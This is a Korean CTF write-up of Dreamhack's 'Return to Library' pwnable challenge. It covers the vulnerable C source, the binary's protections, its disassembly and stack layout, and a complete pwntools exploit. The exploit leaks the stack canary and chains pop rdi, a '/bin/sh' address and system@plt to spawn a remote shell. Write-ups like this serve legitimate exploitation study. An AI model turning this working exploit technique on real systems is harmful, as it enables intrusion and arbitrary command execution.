## 개요

- 분야: Pwnable
- 문제: Dreamhack — Return to Library (RTL)
- 주제: Stack Buffer Overflow + Canary Leak + Return to Library
- 환경: Linux / x86-64

---

## rtl의 C코드

```c
#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
    char buf[0x30];

    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    system("echo 'system@plt'");

    printf("[1] Leak Canary\n");
    printf("Buf: ");
    read(0, buf, 0x100);
    printf("Buf: %s\n", buf);

    printf("[2] Overwrite return address\n");
    printf("Buf: ");
    read(0, buf, 0x100);

    return 0;
}
```

C코드를 보면 `buf`의 크기는 `0x30`(48바이트)이지만, `read()`에서는 최대 `0x100`(256바이트)을 입력받으므로 Stack Buffer Overflow 취약점이 발생한다.

첫 번째 입력에서는 `printf("%s")`로 버퍼의 내용을 출력한다. `read()`는 널 종료 문자를 자동으로 추가하지 않으므로 버퍼를 넘어 인접한 스택 데이터까지 출력될 수 있다.

두 번째 입력에서도 동일한 버퍼를 사용하므로 반환 주소를 덮어쓸 수 있다.

### 보호기법

```console
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

카나리와 NX가 활성화되어 있으며 PIE는 비활성화되어 있다.

카나리는 함수 종료 시 스택 손상을 검사하고, NX는 스택에 삽입한 쉘코드의 실행을 방지한다.

따라서 카나리 값을 유출한 후 기존 실행 영역에 존재하는 코드를 재사용하는 RTL 기법을 이용한다.

---

## 어셈블리

```asm
0x00000000004006f7 <+0>:   push   rbp
0x00000000004006f8 <+1>:   mov    rbp,rsp
0x00000000004006fb <+4>:   sub    rsp,0x40
0x00000000004006ff <+8>:   mov    rax,QWORD PTR fs:0x28
0x0000000000400708 <+17>:  mov    QWORD PTR [rbp-0x8],rax
0x000000000040070c <+21>:  xor    eax,eax
0x000000000040070e <+23>:  mov    rax,QWORD PTR [rip+0x20095b] # 0x601070 <stdin@@GLIBC_2.2.5>
0x0000000000400715 <+30>:  mov    ecx,0x0
0x000000000040071a <+35>:  mov    edx,0x2
0x000000000040071f <+40>:  mov    esi,0x0
0x0000000000400724 <+45>:  mov    rdi,rax
0x0000000000400727 <+48>:  call   0x400600 <setvbuf@plt>
0x000000000040072c <+53>:  mov    rax,QWORD PTR [rip+0x20092d] # 0x601060 <stdout@@GLIBC_2.2.5>
0x0000000000400733 <+60>:  mov    ecx,0x0
0x0000000000400738 <+65>:  mov    edx,0x2
0x000000000040073d <+70>:  mov    esi,0x0
0x0000000000400742 <+75>:  mov    rdi,rax
0x0000000000400745 <+78>:  call   0x400600 <setvbuf@plt>
0x000000000040074a <+83>:  mov    edi,0x40087c
0x000000000040074f <+88>:  mov    eax,0x0
0x0000000000400754 <+93>:  call   0x4005d0 <system@plt>
0x0000000000400759 <+98>:  mov    edi,0x40088e
0x000000000040075e <+103>: call   0x4005b0 <puts@plt>
0x0000000000400763 <+108>: mov    edi,0x40089e
0x0000000000400768 <+113>: mov    eax,0x0
0x000000000040076d <+118>: call   0x4005e0 <printf@plt>
0x0000000000400772 <+123>: lea    rax,[rbp-0x40]
0x0000000000400776 <+127>: mov    edx,0x100
0x000000000040077b <+132>: mov    rsi,rax
0x000000000040077e <+135>: mov    edi,0x0
0x0000000000400783 <+140>: call   0x4005f0 <read@plt>
0x0000000000400788 <+145>: lea    rax,[rbp-0x40]
0x000000000040078c <+149>: mov    rsi,rax
0x000000000040078f <+152>: mov    edi,0x4008a4
0x0000000000400794 <+157>: mov    eax,0x0
0x0000000000400799 <+162>: call   0x4005e0 <printf@plt>
0x000000000040079e <+167>: mov    edi,0x4008ad
0x00000000004007a3 <+172>: call   0x4005b0 <puts@plt>
0x00000000004007a8 <+177>: mov    edi,0x40089e
0x00000000004007ad <+182>: mov    eax,0x0
0x00000000004007b2 <+187>: call   0x4005e0 <printf@plt>
0x00000000004007b7 <+192>: lea    rax,[rbp-0x40]
0x00000000004007bb <+196>: mov    edx,0x100
0x00000000004007c0 <+201>: mov    rsi,rax
0x00000000004007c3 <+204>: mov    edi,0x0
0x00000000004007c8 <+209>: call   0x4005f0 <read@plt>
0x00000000004007cd <+214>: mov    eax,0x0
0x00000000004007d2 <+219>: mov    rcx,QWORD PTR [rbp-0x8]
0x00000000004007d6 <+223>: xor    rcx,QWORD PTR fs:0x28
0x00000000004007df <+232>: je     0x4007e6 <main+239>
0x00000000004007e1 <+234>: call   0x4005c0 <__stack_chk_fail@plt>
0x00000000004007e6 <+239>: leave
0x00000000004007e7 <+240>: ret
```

어셈블리에서 `sub rsp, 0x40`으로 64바이트의 스택 공간을 확보하고, `lea rax, [rbp-0x40]`을 통해 버퍼의 시작 주소를 확인할 수 있다.

또한 `fs:0x28`에서 카나리를 읽어 `[rbp-0x8]`에 저장한다.

버퍼 시작 위치부터 카나리까지의 거리는 다음과 같다.

```text
0x40 - 0x08 = 0x38 (56바이트)
```

따라서 버퍼 48바이트와 패딩 8바이트가 존재한다.

### 스택 구조

```text
높은 주소
┌─────────────────────────┐
│ Return Address (8B)     │
├─────────────────────────┤
│ Saved RBP (8B)          │
├─────────────────────────┤
│ Canary (8B)             │
├─────────────────────────┤
│ Padding (8B)            │
├─────────────────────────┤
│ buf (48B)               │
└─────────────────────────┘
낮은 주소
```

`read()` 호출 부분에서는 `edx`에 `0x100`을 저장하므로 최대 256바이트를 입력받는 것을 확인할 수 있다.

함수 종료 시에는 `[rbp-0x8]`에 저장된 카나리를 원래 값과 비교한다. 값이 같으면 `leave`, `ret`을 통해 반환하고, 다르면 `__stack_chk_fail()`을 호출한다.

### ROP Gadget

x86-64 Linux에서는 첫 번째 함수 인자를 `RDI` 레지스터에 전달한다.

따라서 기존 라이브러리 함수를 호출하기 위해 `pop rdi; ret` 가젯을 활용한다.

`__libc_csu_init`에서 다음 명령어를 확인할 수 있다.

```asm
0x400852: 41 5f    pop r15
0x400854: c3       ret
```

x86-64는 가변 길이 명령어를 사용하므로 명령어 중간 바이트부터 해석하면 다른 명령어가 된다.

```asm
0x400853: 5f       pop rdi
0x400854: c3       ret
```

`pop rdi`는 스택의 값을 RDI에 저장하고 `ret`은 다음 주소로 실행 흐름을 이동시킨다.

---

## Exploit

```python
from pwn import *

p = remote("host3.dreamhack.games", 21892)
e = ELF("./rtl")
r = ROP(e)

system_plt = e.plt['system']
binsh = next(e.search(b'/bin/sh'))

prdi = r.find_gadget(['pop rdi'])[0]
ret = r.find_gadget(['ret'])[0]

payload = b'A'*(0x40-0x8) + b'B'

p.sendafter("Buf: ", payload)
p.recvuntil(payload)

canary = u64(b'\x00' + p.recvn(7))

payload = b'A'*0x38
payload += p64(canary)
payload += b'B'*0x8

payload += p64(ret)
payload += p64(prdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendafter("Buf: ", payload)
p.interactive()
```

### 1. Canary Leak

첫 번째 입력에서는 `printf("%s")`를 이용해 카나리 값을 유출한다.

카나리까지의 거리는 `0x38`(56바이트)이며, x86-64 환경에서 카나리의 첫 바이트는 일반적으로 `0x00`이다.

`printf("%s")`는 널 바이트를 만나면 출력을 중단하기 때문에 카나리의 첫 바이트를 널이 아닌 값으로 변경하여 이후 메모리 데이터가 출력되도록 한다.

```python
payload = b'A'*(0x40-0x8) + b'B'

p.sendafter("Buf: ", payload)
p.recvuntil(payload)

canary = u64(b'\x00' + p.recvn(7))
```

`0x38`바이트를 채운 뒤 `B`를 추가하여 카나리의 첫 바이트를 덮는다.

이후 `recvuntil(payload)`로 입력한 데이터까지 읽고 `recvn(7)`로 나머지 카나리 7바이트를 받아온다.

앞에 원래 첫 바이트인 `b'\x00'`을 붙인 뒤 `u64()`로 변환하여 8바이트 카나리 값을 복원한다.

### 2. 함수 및 Gadget 주소

```python
e = ELF("./rtl")
r = ROP(e)

system_plt = e.plt['system']
binsh = next(e.search(b'/bin/sh'))

prdi = r.find_gadget(['pop rdi'])[0]
ret = r.find_gadget(['ret'])[0]
```

`ELF()`로 실행 파일을 불러오고 `ROP()`로 가젯을 분석한다.

- `e.plt['system']` : `system@plt`의 주소를 가져온다.
- `e.search(b'/bin/sh')` : 실행 파일 내부의 `/bin/sh` 문자열 주소를 검색한다.
- `find_gadget(['pop rdi'])` : 함수의 첫 번째 인자를 설정하는 데 사용할 Gadget을 찾는다.
- `find_gadget(['ret'])` : 스택 정렬에 사용할 ret Gadget을 찾는다.

NX가 활성화되어 있으므로 스택에 쉘코드를 삽입하는 대신 기존 라이브러리 함수인 `system()`을 재사용한다.

### 3. Payload 구성

```python
payload = b'A'*0x38
payload += p64(canary)
payload += b'B'*0x8

payload += p64(ret)
payload += p64(prdi)
payload += p64(binsh)
payload += p64(system_plt)
```

두 번째 입력에서는 분석한 스택 구조에 맞춰 페이로드를 구성한다.

먼저 `0x38`바이트를 채운 뒤 유출한 카나리를 삽입하여 카나리 검사를 통과하도록 한다.

이후 저장된 RBP 영역을 채우고 반환 주소 위치부터 ROP 체인을 구성한다.

`ret` Gadget은 x86-64 함수 호출에서 발생할 수 있는 스택 정렬 문제를 해결하기 위한 것이다.

`pop rdi; ret` Gadget은 `/bin/sh` 문자열의 주소를 함수의 첫 번째 인자로 전달하는 데 활용된다.

마지막으로 `system@plt`를 통해 기존 라이브러리 함수를 재사용한다.

```python
p.sendafter("Buf: ", payload)
p.interactive()
```

완성된 페이로드를 두 번째 입력으로 전달하고 `interactive()`를 통해 대화형 모드로 전환한다.

---

## 결과

Canary Leak으로 카나리 값을 복원하고, ROP Gadget과 `system@plt`를 이용한 Return to Library 기법으로 문제를 해결하였다.

이 문제에서는 스택 구조를 분석하여 카나리의 위치를 파악하고, NX가 활성화된 환경에서 기존 코드와 라이브러리 함수를 재사용하는 방식을 확인하였다.

특히 ret2win과 달리 **함수 인자 전달, ROP Gadget, 스택 정렬**까지 고려해야 한다는 점이 핵심이다.